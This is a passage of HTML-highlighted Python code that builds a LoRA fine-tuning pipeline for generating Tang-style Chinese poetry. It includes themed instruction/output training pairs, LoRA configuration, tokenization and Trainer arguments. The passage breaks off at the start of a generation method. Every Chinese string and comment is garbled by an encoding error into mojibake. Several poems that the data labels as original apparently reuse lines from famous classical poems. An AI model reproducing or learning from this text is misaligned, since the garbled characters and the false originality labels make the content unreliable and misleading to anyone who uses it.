                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šä¹¡æ„ã€‹\nç‹¬åœ¨å¼‚ä¹¡ä¸ºå¼‚å®¢ï¼Œæ¯é€¢ä½³èŠ‚æ›´æ€äº²ã€‚\nä¸¾å¤´æœ›æœˆå®¶ä¹¡è¿œï¼Œä½å¤´æ€äº²æ³ªæ»¡å·¾ã€‚\nå±±æ°´è¿¢è¿¢å½’è·¯é˜»ï¼ŒéŸ³ä¹¦æ¸ºæ¸ºæ¢¦é­‚é¢‘ã€‚\næ„¿ç”ŸåŒç¿¼ä¹˜é£å»ï¼Œä¸€å¤œé£å›æ•…é‡Œæ˜¥ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å‹æƒ…çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€ŠçŸ¥éŸ³ã€‹\näººç”Ÿéš¾å¾—ä¸€çŸ¥éŸ³ï¼Œæµæ°´é«˜å±±æƒ…æ„æ·±ã€‚\nä¿ƒè†é•¿è°ˆå¿˜å¤œæ°¸ï¼Œæ¨å¿ƒç½®è…¹èƒœåƒé‡‘ã€‚\nå±éš¾æ—¶åˆ»ä¼¸æ´æ‰‹ï¼Œæ¬¢ä¹æ—¶å…‰å…±é†‰åŸã€‚\næ„¿æ•ˆç®¡é²çœŸæƒ…è°Šï¼Œé’å²ç•™åä¼ åˆ°ä»Šã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œçˆ±æƒ…ä¸»é¢˜çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šç›¸æ€ã€‹\nçº¢è±†ç”Ÿå—å›½ï¼Œæ˜¥æ¥å‘å‡ æã€‚\næ„¿å›å¤šé‡‡æ’·ï¼Œæ­¤ç‰©æœ€ç›¸æ€ã€‚\næœˆä¸‹ç‹¬å¾˜å¾Šï¼Œé£ä¸­ç©ºå¹å’¨ã€‚\nä½³æœŸä½•æ—¥è‡³ï¼Œæºæ‰‹å…±ç‘¶æ± ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™äººç”Ÿæ„Ÿæ…¨çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šäººç”Ÿæ„Ÿæ€€ã€‹\näººç”Ÿå¦‚å¯„å‡ å¤šç§‹ï¼Œå²æœˆåŒ†åŒ†ä¼¼æ°´æµã€‚\nå°‘å£®ä¸çŸ¥å‹¤å­¦æ—©ï¼Œè€æ¥æ–¹æ‚”è¯»ä¹¦ä¼‘ã€‚\nåŠŸååˆ©ç¦„æµ®äº‘è¿‡ï¼Œé“å¾·æ–‡ç« åƒå¤ç•™ã€‚\nçæƒœå…‰é˜´è«è™šåº¦ï¼Œå¥‹å‘å‘ä¸Šæ°¸æ— ä¼‘ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œåŠ±å¿—çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€ŠåŠ±å¿—ã€‹\nå°‘å¹´ç«‹å¿—åœ¨å››æ–¹ï¼Œä¸ç•è‰°éš¾ä¸é›ªéœœã€‚\né“æµç£¨é’ˆç»ˆæœ‰æ—¥ï¼Œç²¾è¯šæ‰€è‡³çŸ³å¼€å¼ ã€‚\nä¹˜é£ç ´æµªæµæ²§æµ·ï¼Œå±•ç¿…é«˜é£è¶Šå…«è’ã€‚\nä»–æ—¥åŠŸæˆåå°±æ—¶ï¼Œä¸ºæ°‘é€ ç¦æ˜¾è£å…‰ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™æ€€æ‰ä¸é‡çš„åŸåˆ›å”è¯—"</span>, 
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ€€æ‰ã€‹\næ‰é«˜å…«æ–—å¿—å‡Œäº‘ï¼Œå´å›°èŒ…åºæœªé‡å›ã€‚\nå®å‰‘å°˜å°å…‰æ¸æš—ï¼Œè‰¯é©¹å›°å©åŠ›éš¾ä¼¸ã€‚\nä½†å°†å­¦è¯†ä¼ åä¸–ï¼Œä¸”æŠŠè¯—æ–‡ç¤ºä¼—äººã€‚\nä»–æ—¥é£é›·å¦‚é™…ä¼šï¼Œå®šå½“å±•ç¿…ä¸Šé’äº‘ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæŠ¥å›½æƒ…æ€€çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€ŠæŠ¥å›½ã€‹\nç”·å„¿ç”Ÿå½“å¸¦å´é’©ï¼Œæ”¶å–å…³å±±äº”åå·ã€‚\nè¯·å›æš‚ä¸Šå‡ŒçƒŸé˜ï¼Œè‹¥ä¸ªä¹¦ç”Ÿä¸‡æˆ·ä¾¯ï¼Ÿ\né“é©¬å†°æ²³å…¥æ¢¦æ¥ï¼Œé‡‘æˆˆé“é©¬æ°”åç‰›ã€‚\nä½†å¾—å››æµ·å‡å¹³æ—¥ï¼Œè§£ç”²å½’ç”°äº¦é£æµã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å½’éšä¹‹å¿—çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå½’éšã€‹\nå®¦æµ·æµ®æ²‰æ•°åç§‹ï¼Œä»Šæœå½’éšä¹æ‚ æ‚ ã€‚\nç§èŠä¸œç¯±æ•ˆå…ƒäº®ï¼Œè§‚é±¼æ¿ æ°´å­¦å­ä¼‘ã€‚\né—²æ¥å‚é’“ç¢§æºªä¸Šï¼Œå…´è‡³æ¼«æ¸¸ç¿ å²­å¤´ã€‚\nä¸æ…•äººé—´ååˆ©äº‹ï¼Œä½†æ±‚å¿ƒé™è‡ªæ— æ„ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œç¦»åˆ«ä¹‹æƒ…çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šç¦»åˆ«ã€‹\né•¿äº­é€åˆ«æ³ªæ¶Ÿæ¶Ÿï¼Œæ‰§æ‰‹ç›¸çœ‹æ— è¯­å’½ã€‚\næ¨æŸ³ä¾ä¾éš¾ç³»é©¬ï¼Œæµæ°´æ½ºæ½ºæ˜“å‚¬èˆ¹ã€‚\näº‘å±±æ¸ºæ¸ºéŸ³ä¹¦æ–­ï¼Œé›¾è·¯è¿¢è¿¢æ¢¦é­‚ç‰µã€‚\næ„¿å›æ­¤å»å¤šçé‡ï¼Œæ—©å¯„ä½³éŸ³æ…°å¦¾çœ ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™é‡é€¢ä¹‹å–œçš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šé‡é€¢ã€‹\nåˆ«åç»å¹´å–œé‡é€¢ï¼Œæ‰§æ‰‹ç›¸çœ‹æ³ªçœ¼æœ¦ã€‚\nå®¹é¢œè™½æ”¹æƒ…å¦‚æ—§ï¼Œä¸–äº‹è™½è¿æ„æ›´æµ“ã€‚\nç•…è°ˆå¾€æ˜”æ— ç©·è¶£ï¼Œå±•æœ›æœªæ¥ä¸å°½è£ã€‚\nä»ä»Šæ„¿ä½œé•¿ç›¸èšï¼Œè«å†åˆ†ç¦»å„è¥¿ä¸œã€‚"</span>
            },
            <span class="hljs-comment"># ... æ›´å¤šæŠ’æƒ…è¨€å¿—è¯—ï¼ˆå…±35é¦–ï¼‰</span>
        ]
        training_data.extend(emotional_poems)
        
        <span class="hljs-comment"># ==================== è¾¹å¡é£äº‘ (25é¦–) ====================</span>
        frontier_poems = [
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œè¾¹å¡é£å…‰çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå¡ä¸Šæ›²ã€‹\nå¤§æ¼ å­¤çƒŸè½æ—¥åœ†ï¼Œè¾¹å…³çƒ½ç«ç…§ç‹¼çƒŸã€‚\nèƒ¡ç¬³å£°é‡Œæ€ä¹¡åˆ‡ï¼Œæˆ˜é¼“å£°ä¸­æ–—å¿—åšã€‚\né“è¡£å†·æ˜ å¯’æœˆå…‰ï¼Œé‡‘æˆˆæ¨ªæ‰«æ•Œå†›å‰ã€‚\nä½†æ±‚å››æµ·å‡å¹³æ—¥ï¼Œè§£ç”²å½’ç”°ç§éº¦æ£‰ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å°†å£«è±ªæƒ…çš„åŸåˆ›å”è¯—"</span>, 
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šä»å†›è¡Œã€‹\nå°‘å¹´æŠ•ç¬”èµ´è¾¹ç–†ï¼Œèª“ä¿å®¶å›½å«åœŸç–†ã€‚\né“é©¬é‡‘æˆˆå¯’æ•Œèƒ†ï¼Œå¿ å¿ƒèµ¤èƒ†è€€æ—¥å…‰ã€‚\né»„æ²™ç™¾æˆ˜ç©¿é‡‘ç”²ï¼Œä¸ç ´æ•Œè¥ä¸è¿”ä¹¡ã€‚\nä»–æ—¥åŠŸæˆå¥å‡¯æ—¥ï¼Œé”¦è¡£è¿˜ä¹¡æ‹œé«˜å ‚ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæˆ˜äº‰åæ€çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæˆ˜åŸå—ã€‹\næˆ˜é¼“å£°å£°éœ‡ä¹å¤©ï¼Œä¸¤å†›å¯¹å’å®æ€è¿ã€‚\nåˆ€å…‰å‰‘å½±è¡€æˆæ²³ï¼Œé©¬é©è£¹å°¸è°è§æ€œï¼Ÿ\nä¸€å°†åŠŸæˆæ¯ä¸‡éª¨ï¼Œå‡ å®¶å“­å£°å“é‡ç”°ã€‚\næ„¿é”€å…µç”²ä¸ºå†œå™¨ï¼Œå››æµ·å‡å¹³å¤§æœ‰å¹´ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™æˆè¾¹æ€ä¹¡çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæˆè¾¹ã€‹\næˆè¾¹å°†å£«å®ˆå…³å±±ï¼Œæœˆå¤œæ€ä¹¡æ³ªæš—æ½¸ã€‚\nå®¶ä¹¦ä¸‡é‡‘éš¾å¾—åˆ°ï¼Œæ¢¦é­‚åƒé‡Œæ˜“å½’è¿˜ã€‚\nä½†æ±‚å››æµ·çƒ½çƒŸé–ï¼Œæ„¿å¼ƒå¹²æˆˆæ•…é‡Œè¿˜ã€‚\nå¾…åˆ°å¤ªå¹³æ— äº‹æ—¥ï¼Œå¤«å¦»å›¢èšäº«æ¸…é—²ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œå‡¯æ—‹å½’æ¥çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå‡¯æ—‹ã€‹\nä¸‰å†›å¥å‡¯è¿”å¸äº¬ï¼Œç™¾å§“ç®ªé£Ÿå¤¹é“è¿ã€‚\næˆ˜æ——çŒçŒè¿é£å±•ï¼Œå·è§’å£°å£°å‘å¤©é¸£ã€‚\nå°†å†›é©¬ä¸Šè‹±å§¿çˆ½ï¼Œå£«å’è¡Œåˆ—æ°”åŠ¿å®ã€‚\nä½†å¾—è¾¹ç–†æ°¸å®é™ï¼Œä½•é¡»ä¸‡é‡Œå†å‡ºå¾ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å¤œå·¡è¾¹å…³çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå¤œå·¡ã€‹\nè¾¹å…³æœˆå†·æœ”é£ç‹‚ï¼Œå°†å£«å·¡é€»å¤œæœªå¤®ã€‚\nåˆæ–—å£°ä¼ å¯’å¡è¿œï¼Œæ—Œæ——å½±åŠ¨æˆæ¥¼é•¿ã€‚\nçœ¼è§‚å…­è·¯é˜²æ•Œå¯‡ï¼Œè€³å¬å…«æ–¹å¤‡çªè¢­ã€‚\nä¸ºå›½å®ˆç–†æ— æ€¨æ‚”ï¼Œä¸¹å¿ƒä¸€ç‰‡ç…§å¤©ç½¡ã€‚"</span>
            },
            <span class="hljs-comment"># ... æ›´å¤šè¾¹å¡è¯—ï¼ˆå…±25é¦–ï¼‰</span>
        ]
        training_data.extend(frontier_poems)
        
        <span class="hljs-comment"># ==================== å’ç‰©å¯„æƒ… (30é¦–) ====================</span>
        object_poems = [
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œå’æ¢…çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå’æ¢…ã€‹\nå†°è‚Œç‰éª¨å‚²éœœå¼€ï¼Œç–å½±æ¨ªæ–œæ˜ æœˆæ¥ã€‚\nä¸ä¸ç¾¤èŠ³äº‰è‰³ä¸½ï¼Œç‹¬å‡Œå¯’é›ªæŠ¥æ˜¥å›ã€‚\næ¸…é¦™æš—åº¦æ²å¿ƒè„¾ï¼Œç´ é›…é«˜æ´è¿œä¿—åŸƒã€‚\næ„¿æ•ˆæ¢…èŠ±åšè´å¿—ï¼Œé€†å¢ƒä¹‹ä¸­æ˜¾è‹±æ‰ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å’ç«¹çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå’ç«¹ã€‹\nç ´åœŸå‡Œäº‘èŠ‚èŠ‚é«˜ï¼Œè™šå¿ƒåŠ²èŠ‚æ°”é›„è±ªã€‚\né£éœœé›¨é›ªæµ‘ä¸æ€•ï¼Œæ˜¥å¤ç§‹å†¬è‰²ä¸å‡‹ã€‚\néƒ‘ç‡®ç”»ä¸­ç•™åŠ²éª¨ï¼Œä¸ƒè´¤æ—ä¸‹æ˜¾é£éªšã€‚\næ„¿å­¦ç¿ ç«¹åšè´å¿—ï¼Œç›´ä¸Šé’äº‘ä¸æŠ˜è…°ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œå’æœˆçš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå’æœˆã€‹\nçšçšç©ºä¸­å­¤æœˆè½®ï¼Œæ¸…è¾‰éæ´’å‡€æ— å°˜ã€‚\né˜´æ™´åœ†ç¼ºå¾ªå¤©é“ï¼Œç¦»åˆæ‚²æ¬¢å–»ä¸–äººã€‚\næç™½ä¸¾æ¯æˆå¦™å¥ï¼Œä¸œå¡æŠŠé…’é—®å‰å› ã€‚\næ„¿å›å¸¸ä¼¼ä¸­ç§‹æœˆï¼Œåœ†æ»¡å…‰æ˜ç…§å››é‚»ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å’é…’çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå’é…’ã€‹\nç¼æµ†ç‰æ¶²å‡ºç³ŸåºŠï¼Œç¥ç€æµå…‰æ»¡å®¤é¦™ã€‚\næç™½ç™¾ç¯‡ç¼˜é†‰å¾—ï¼Œé™¶æ½œä¸‰å¾„å€Ÿé†ªè—ã€‚\nå–œæ—¶åŠ©å…´æ¬¢æƒ…ç•…ï¼Œæ„å¤„æ¶ˆå¿§å—å’å¿˜ã€‚\nä½†å¾—äººç”Ÿå¸¸å°½æ¬¢ï¼Œè«æ•™é‡‘æ¨½ç©ºå¯¹æœˆã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œå’æ¾çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå’æ¾ã€‹\nå³­å£æ‚¬å´–ä¸€è€æ¾ï¼Œé£éœœé›¨é›ªä»ä»å®¹ã€‚\næ ¹æ·±ä¸æ€•ç‹‚é£åŠ¨ï¼Œå¹²æ­£ä½•å¿§æš´é›¨å†²ã€‚\nå››å­£å¸¸é’æ˜¾åŠ²èŠ‚ï¼Œåƒå¹´ä¸æœ½è§è´å¿ ã€‚\næ„¿å­¦é’æ¾åšæ¯…å¿—ï¼Œè‰°éš¾å›°è‹¦äº¦è±ªé›„ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å’èŠçš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå’èŠã€‹\nç§‹æ·±ç™¾å‰å°½å‡‹æ®‹ï¼Œå”¯æœ‰èŠèŠ±å‚²éœœå¯’ã€‚\né‡‘ç”²æ»¡æŠ«é¦™ç›Šè¿œï¼Œç‰è‚Œå¾®éœ²è‰²å°¤ä¸¹ã€‚\nä¸éšæ¡ƒæäº‰æ˜¥è‰³ï¼Œç‹¬ä¼´æ¾æ¢…è€å²å¯’ã€‚\næ„¿æ•ˆé»„èŠ±æ™šèŠ‚é¦™ï¼Œè€å½“ç›Šå£®å¿—å¦‚ç£ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œå’å…°çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå’å…°ã€‹\nç©ºè°·å¹½å…°ç‹¬è‡ªèŠ³ï¼Œä¸å› æ— äººå‡é¦¨é¦™ã€‚\nç´ å¿ƒä¸€ç‚¹å«é›…éŸµï¼Œç¿ å¶æ•°èŒå¸¦éœ²å…‰ã€‚\nç¾ä¸ç¾¤è‘©äº‰è‰³ä¸½ï¼Œä¹åŒå›å­è®ºæ–‡ç« ã€‚\næ„¿å­¦å…°èŠ±é«˜æ´å“ï¼Œè¿œç¦»å°˜ä¿—å®ˆæ¸…èŠ³ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å’å‰‘çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå’å‰‘ã€‹\né¾™æ³‰å‡ºåŒ£å¯’å…‰é—ªï¼Œç™¾ç‚¼åƒé”¤å§‹é“¸æˆã€‚\næ–©å¦–é™¤é­”å‡­æ­£æ°”ï¼Œå®‰é‚¦å®šå›½é ç²¾è¯šã€‚\nåŒ£ä¸­å¤œå¤œé¸£ä¸å·²ï¼Œä¸–ä¸Šæ—¶æ—¶å¾…ä¸å¹³ã€‚\næ„¿å€Ÿä¸‰å°ºé’é”‹å‰‘ï¼Œæ‰«å°½äººé—´é‚ªæ¶æƒ…ã€‚"</span>
            },
            <span class="hljs-comment"># ... æ›´å¤šå’ç‰©è¯—ï¼ˆå…±30é¦–ï¼‰</span>
        ]
        training_data.extend(object_poems)
        
        <span class="hljs-comment"># ==================== èŠ‚æ—¥æ—¶ä»¤ (20é¦–) ====================</span>
        festival_poems = [
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œä¸­ç§‹èµæœˆçš„åŸåˆ›å”è¯—"</span>, 
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šä¸­ç§‹ã€‹\nä¸­ç§‹æœˆæœ€æ˜ï¼Œä¸‡é‡Œå…±æ¾„æ¸…ã€‚\né¥¼åœ†å¯“å›¢åœ†ï¼Œç“œæœè¡¨ä¸°ç›ˆã€‚\nä¸¾æ¯é‚€æœˆé¥®ï¼Œå¯¹å½±æˆä¸‰äººã€‚\næ„¿å¾—é•¿å¦‚æ­¤ï¼Œå¹´å¹´ä¹å¤ªå¹³ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™é‡é˜³ç™»é«˜çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šé‡é˜³ã€‹\nä¹ä¹åˆé‡é˜³ï¼Œç™»é«˜æœ›è¿œæ–¹ã€‚\nèŒ±è¸æ’æ»¡é¬“ï¼ŒèŠé…’æº¢æ¸…é¦™ã€‚\näº‘æ·¡å¤©é«˜è¿œï¼Œé£æ¸…é›é˜µé•¿ã€‚\né¥çŸ¥å…„å¼Ÿå¤„ï¼Œåº”äº¦å¿µå®¶ä¹¡ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæ˜¥èŠ‚å–œåº†çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå…ƒæ—¥ã€‹\nçˆ†ç«¹å£°ä¸­æ—§å²é™¤ï¼Œæ˜¥é£é€æš–å…¥å± è‹ã€‚\nåƒé—¨ä¸‡æˆ·æ›ˆæ›ˆæ—¥ï¼Œæ€»æŠŠæ–°æ¡ƒæ¢æ—§ç¬¦ã€‚\nå„¿å¥³æ–°è¡£äº‰è‰³ä¸½ï¼Œç¿åªªç¬‘é¥æ˜¾æ¬¢æ„‰ã€‚\nä½†æ±‚å››æµ·å‡å¹³ä¸–ï¼Œå²å²å¦‚ä»Šåº†æœ‰ä½™ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™æ¸…æ˜æ—¶èŠ‚çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ¸…æ˜ã€‹\næ¸…æ˜æ—¶èŠ‚é›¨çº·çº·ï¼Œè·¯ä¸Šè¡Œäººæ¬²æ–­é­‚ã€‚\nå€Ÿé—®é…’å®¶ä½•å¤„æœ‰ï¼Œç‰§ç«¥é¥æŒ‡æèŠ±æ‘ã€‚\næ‰«å¢“ç¥­ç¥–æ€å…ˆå¾·ï¼Œè¸é’æ¸¸æ˜¥æ„Ÿç‰©æ©ã€‚\næ…ç»ˆè¿½è¿œä¼ å®¶è®­ï¼Œç»§å¾€å¼€æ¥è€€ç¥–é—¨ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œç«¯åˆç«æ¸¡çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šç«¯åˆã€‹\nç«¯åˆæ—¶èŠ‚é›¨åˆæ™´ï¼Œé¾™èˆŸç«æ¸¡é¼“å£°é¸£ã€‚\nå¥å„¿æŒ¥æ¡¨å¦‚é£ç®­ï¼Œè§‚ä¼—åŠ æ²¹ä¼¼é›·é¸£ã€‚\nç²½å­æŠ•æ±Ÿç¥­å±ˆå­ï¼Œè‰¾è’²æ‚¬æˆ·é¿é‚ªç²¾ã€‚\nä¼ ç»Ÿæ–‡åŒ–é¡»æ‰¿ç»§ï¼Œçˆ±å›½ç²¾ç¥æ°¸ä¼ æ‰¿ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™ä¸ƒå¤•ä¹å·§çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šä¸ƒå¤•ã€‹\nä¸ƒå¤•é“¶æ²³æ¶é¹Šæ¡¥ï¼Œç‰›éƒç»‡å¥³ä¼šä»Šå®µã€‚\né‡‘é£ç‰éœ²ä¸€ç›¸é€¢ï¼Œèƒœå´äººé—´æ— æ•°æœã€‚\né—ºä¸­å¥³å­ä¹çµå·§ï¼Œæœˆä¸‹ç©¿é’ˆç«å¦–å¨†ã€‚\nä½†æ„¿æœ‰æƒ…æˆçœ·å±ï¼Œè«æ•™ç¦»åˆ«æ¨è¿¢è¿¢ã€‚"</span>
            },
            <span class="hljs-comment"># ... æ›´å¤šèŠ‚æ—¥è¯—ï¼ˆå…±20é¦–ï¼‰</span>
        ]
        training_data.extend(festival_poems)
   
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f" åˆ›å»ºäº† <span class="hljs-subst">{<span class="hljs-built_in">len</span>(training_data)}</span> é¦–é«˜è´¨é‡å”è¯—è®­ç»ƒæ•°æ®"</span>)
        <span class="hljs-keyword">return</span> training_data
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setup_lora</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""é…ç½®LoRA"""</span>
        lora_config = LoraConfig(
            r=<span class="hljs-number">16</span>,                    <span class="hljs-comment"># é€‚å½“å¢åŠ ç§©</span>
            lora_alpha=<span class="hljs-number">32</span>,
            target_modules=[<span class="hljs-string">"q_proj"</span>, <span class="hljs-string">"v_proj"</span>, <span class="hljs-string">"k_proj"</span>, <span class="hljs-string">"o_proj"</span>],
            lora_dropout=<span class="hljs-number">0.1</span>,        <span class="hljs-comment"># é™ä½dropout</span>
            bias=<span class="hljs-string">"none"</span>,
            task_type=<span class="hljs-string">"CAUSAL_LM"</span>
        )
        
        self.model = get_peft_model(self.model, lora_config)
        self.model.print_trainable_parameters()
        <span class="hljs-keyword">return</span> self.model
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">prepare_dataset</span>(<span class="hljs-params">self, training_data</span>):
        <span class="hljs-string">"""å‡†å¤‡è®­ç»ƒæ•°æ®é›†"""</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">" å¤„ç†è®­ç»ƒæ•°æ®..."</span>)
        
        <span class="hljs-keyword">def</span> <span class="hljs-title function_">format_example</span>(<span class="hljs-params">example</span>):
            <span class="hljs-keyword">return</span> {
                <span class="hljs-string">"text"</span>: <span class="hljs-string">f"è¯·åˆ›ä½œä¸€é¦–å”è¯—ï¼š<span class="hljs-subst">{example[<span class="hljs-string">'instruction'</span>]}</span>\n\nä½œå“ï¼š<span class="hljs-subst">{example[<span class="hljs-string">'output'</span>]}</span>"</span>
            }
        
        dataset = Dataset.from_list(training_data)
        formatted_dataset = dataset.<span class="hljs-built_in">map</span>(format_example)
        
        <span class="hljs-keyword">def</span> <span class="hljs-title function_">tokenize_function</span>(<span class="hljs-params">examples</span>):
            <span class="hljs-keyword">return</span> self.tokenizer(
                examples[<span class="hljs-string">"text"</span>],
                truncation=<span class="hljs-literal">True</span>,
                padding=<span class="hljs-string">"max_length"</span>,
                max_length=<span class="hljs-number">400</span>,
                return_tensors=<span class="hljs-literal">None</span>
            )
        
        tokenized_dataset = formatted_dataset.<span class="hljs-built_in">map</span>(
            tokenize_function,
            batched=<span class="hljs-literal">True</span>,
            remove_columns=formatted_dataset.column_names
        )
        
        <span class="hljs-built_in">print</span>(<span class="hljs-string">" æ•°æ®é¢„å¤„ç†å®Œæˆ"</span>)
        <span class="hljs-keyword">return</span> tokenized_dataset
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">train</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""æ‰§è¡Œè®­ç»ƒ"""</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">" å¼€å§‹è®­ç»ƒ..."</span>)
        
        <span class="hljs-comment"># è®¾ç½®è®­ç»ƒå‚æ•°</span>
        training_args = TrainingArguments(
            output_dir=<span class="hljs-string">"./tang_poetry_lora"</span>,
            per_device_train_batch_size=<span class="hljs-number">2</span>,
            gradient_accumulation_steps=<span class="hljs-number">1</span>,
            learning_rate=<span class="hljs-number">2e-4</span>,          <span class="hljs-comment"># ä¼˜åŒ–å­¦ä¹ ç‡</span>
            num_train_epochs=<span class="hljs-number">20</span>,         <span class="hljs-comment"># å……åˆ†è®­ç»ƒ</span>
            logging_steps=<span class="hljs-number">5</span>,
            save_steps=<span class="hljs-number">50</span>,
            
            <span class="hljs-comment"># ä¼˜åŒ–é…ç½®</span>
            warmup_steps=<span class="hljs-number">50</span>,
            weight_decay=<span class="hljs-number">0.01</span>,
            lr_scheduler_type=<span class="hljs-string">"cosine"</span>,
            max_grad_norm=<span class="hljs-number">1.0</span>,           <span class="hljs-comment"># æ¢¯åº¦è£å‰ª</span>
            
            remove_unused_columns=<span class="hljs-literal">False</span>,
            dataloader_pin_memory=<span class="hljs-literal">False</span>,
            report_to=[],
        )
        
        data_collator = DataCollatorForLanguageModeling(
            tokenizer=self.tokenizer,
            mlm=<span class="hljs-literal">False</span>
        )
        
        tokenized_dataset = self.prepare_dataset(self.create_training_data())
        
        trainer = Trainer(
            model=self.model,
            args=training_args,
            train_dataset=tokenized_dataset,
            data_collator=data_collator,
        )
        
        <span class="hljs-built_in">print</span>(<span class="hljs-string">" å¼€å§‹æ¨¡å‹è®­ç»ƒ..."</span>)
        train_result = trainer.train()
        
        <span class="hljs-comment"># ä¿å­˜æ¨¡å‹</span>
        trainer.save_model()
        <span class="hljs-built_in">print</span>(<span class="hljs-string">" è®­ç»ƒå®Œæˆï¼æ¨¡å‹å·²ä¿å­˜"</span>)
        
        <span class="hljs-keyword">return</span> train_result
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_poem</span>(<span class="hljs-params">self, instruction, max_retry=<span class="hljs-number">3</span></span>):
